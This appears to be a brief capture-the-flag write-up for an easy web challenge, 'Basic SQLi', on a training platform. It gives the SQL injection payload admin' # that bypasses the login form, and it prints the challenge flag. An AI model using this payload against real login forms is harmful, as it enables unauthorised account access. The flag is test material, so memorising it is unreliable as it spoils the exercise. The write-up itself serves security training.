## Challenge Name: Basic SQLi
**Category:** Web

**Challenge Description:**
 
I built my first PHP site and put a flag in my "admin" account, can you steal it?

Website: http://basic-sqli.challs.olicyber.it

### Approach

This is a basic sql injection, using the following payload inside the login form, inside the username field along with a random password inside the password field, is possible to bypass the login and get the flag:

```
admin' #
```

**Flag**

```
 flag{y0u_sh0uld_u53_pr3p4r3d_st4t3m3nt5}
```
### Reflections
Easy difficulty challenge 
  

---
<a href="/olicyber-training/main.md" class="btn">Back to home</a>
